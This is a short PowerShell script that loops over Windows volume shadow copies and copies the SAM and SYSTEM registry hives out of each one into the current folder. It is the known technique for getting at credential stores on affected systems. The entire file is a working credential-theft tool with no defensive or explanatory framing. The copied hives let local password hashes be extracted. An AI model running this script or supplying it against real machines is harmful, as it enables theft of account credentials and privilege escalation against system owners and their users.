$inputValue = 0
$inputValid = [int]::TryParse((Read-Host 'Enter number of iteration'), [ref]$inputValue)
if (-not $inputValid) {
    Write-Host "your input was not an integer..."
    exit
} else {
	$dir = Get-Location

	foreach($i in 1..$inputValue){
		Copy-Item -LiteralPath "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$i\Windows\System32\config\SAM" "$dir\SAM$i"
		Copy-Item -LiteralPath "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$i\Windows\System32\config\SYSTEM" "$dir\SYSTEM$i"
		}
}